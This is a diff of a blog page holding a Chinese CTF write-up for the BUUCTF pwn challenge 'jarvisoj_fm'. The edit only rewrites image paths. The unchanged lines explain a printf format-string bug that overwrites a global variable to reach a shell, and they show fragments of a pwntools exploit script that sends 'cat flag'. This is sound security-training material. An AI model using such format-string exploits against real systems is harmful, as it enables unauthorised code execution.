@@ -36,14 +36,14 @@
 <main>
 <h1 id="buuctf-pwn-jarvisoj_fm">BUUCTF Pwn Jarvisoj_fm</h1>
 <p>考点：格式化字符串改写任意地址内容</p>
-<p><img src="D:%5CGithub%5Cmyblog%5Cstatic%5Cimages%5Cimage-20200409193343106.png" alt="image-20200409193343106"></p>
+<p><img src="/images/image-20200409193343106.png" alt="image-20200409193343106"></p>
 <p>32位，开启canary、nx</p>
-<p><img src="D:%5CGithub%5Cmyblog%5Cstatic%5Cimages%5Cimage-20200409193151922.png" alt="image-20200409193151922"></p>
+<p><img src="/images/image-20200409193151922.png" alt="image-20200409193151922"></p>
 <p>存在printf可以利用格式化字符串漏洞修改x的内容为4来绕过if判断从而getshell</p>
-<p><img src="D:%5CGithub%5Cmyblog%5Cstatic%5Cimages%5Cimage-20200409193641752.png" alt="image-20200409193641752"></p>
+<p><img src="/images/image-20200409193641752.png" alt="image-20200409193641752"></p>
 <p>x地址为0x0804a02c，.data有读写权限</p>
-<p><img src="D:%5CGithub%5Cmyblog%5Cstatic%5Cimages%5Cimage-20200409194017184.png" alt="image-20200409194017184"></p>
-<p><img src="D:%5CGithub%5Cmyblog%5Cstatic%5Cimages%5Cimage-20200409194046308.png" alt="image-20200409194046308"></p>
+<p><img src="/images/image-20200409194017184.png" alt="image-20200409194017184"></p>
+<p><img src="/images/image-20200409194046308.png" alt="image-20200409194046308"></p>
 <p>输入的第1个内容的栈偏移为11个单位（32位4字节）</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/env python2</span>
 <span style="color:#75715e">#-*- coding=UTF-8 -*-</span>
@@ -61,7 +61,7 @@ payload <span style="color:#f92672">=</span> <span style="color:#e6db74"></span>
 sh<span style="color:#f92672">.</span>sendline(payload)
 sh<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">cat flag</span><span style="color:#e6db74">&#39;</span>)
 sh<span style="color:#f92672">.</span>interactive()
-</code></pre></div><p><img src="D:%5CGithub%5Cmyblog%5Cstatic%5Cimages%5Cimage-20200409193314193.png" alt="image-20200409193314193"></p>
+</code></pre></div><p><img src="/images/image-20200409193314193.png" alt="image-20200409193314193"></p>
 
 </main>
 
